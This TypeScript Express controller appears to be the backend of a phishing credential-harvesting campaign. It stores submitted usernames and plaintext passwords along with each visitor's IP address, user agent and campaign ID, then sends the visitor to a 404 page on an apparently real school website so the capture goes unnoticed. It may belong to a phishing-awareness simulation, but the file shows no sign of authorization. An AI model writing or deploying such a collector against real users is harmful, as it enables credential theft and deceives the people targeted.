import { Request, Response } from 'express';
import { Credential } from '../models/credential.model';
import { Password } from '../models/password.model';

export const credentialController = {
  async create(req: Request, res: Response) {
    try {
      const { username, password, campaignId } = req.body;
      console.log('Received request:', { username, campaignId });
      
      const credential = new Credential({
        username,
        ipAddress: req.ip,
        userAgent: req.headers['user-agent'],
        campaign: campaignId
      });
      
      console.log('Created credential:', credential);
      await credential.save();
      console.log('Saved credential');
  
      const passwordEntry = new Password({
        username,
        password,
        credential: credential._id
      });
  
      console.log('Created password entry:', passwordEntry);
      await passwordEntry.save();
      console.log('Saved password');
      
      res.status(201).json({ 
        redirect: 'https://www.prumyslovkaliberec.cz/404'
      });
    } catch (error: any) { // Přidáno typování error jako any
      console.error('Detailed error:', error);
      res.status(500).json({ 
        error: 'Internal server error',
        details: error.message || 'Unknown error occurred'
      });
    }
  }
};